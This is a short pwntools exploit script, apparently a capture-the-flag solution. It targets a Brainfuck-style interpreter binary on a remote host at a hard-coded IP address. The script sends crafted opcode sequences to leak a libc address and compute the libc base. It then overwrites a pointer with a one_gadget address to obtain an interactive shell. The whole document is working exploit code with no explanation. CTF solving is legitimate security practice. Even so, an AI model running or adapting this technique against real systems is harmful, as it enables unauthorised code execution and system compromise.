from pwn import *

context(log_level='DEBUG', arch='amd64', os='linux')
context.terminal = "wt.exe nt bash -c".split()

# sh = process(['./chall'])
sh = remote("47.108.29.107", 10173)
elf = ELF('./chall')
libc = ELF('./libc-2.27.so')

idx_2 = b'\x2B'
idx_5 = b'\x2C'
idx_3 = b'\x2D'
idx_4 = b'\x2E'
idx_0 = b'\x3c'
idx_1 = b'\x3e'
idx_6 = b'\x5b'
idx_8 = b'\x00'
idx_9 = b'\x01'


sh.sendlineafter(b"len", b"100")
sh.sendlineafter(b"code> ", idx_1*0x1F + (idx_1 + idx_4)*0x06)

libc_base = u64((sh.recvuntil(b'len', drop=True)).ljust(8, b'\x00')) - 0x401b40
one_gadget = libc_base + 0x4f302
print("libc_base >>>", hex(libc_base))

sh.sendlineafter(b">", b"100")
sh.sendlineafter(b"code> ", idx_1*(0x2F+8) + (idx_1 + idx_5)*0x06 )
# gdb.attach(sh, f"b *{one_gadget}")
# pause()
sh.send(p64(one_gadget)[:-2])
sh.interactive()
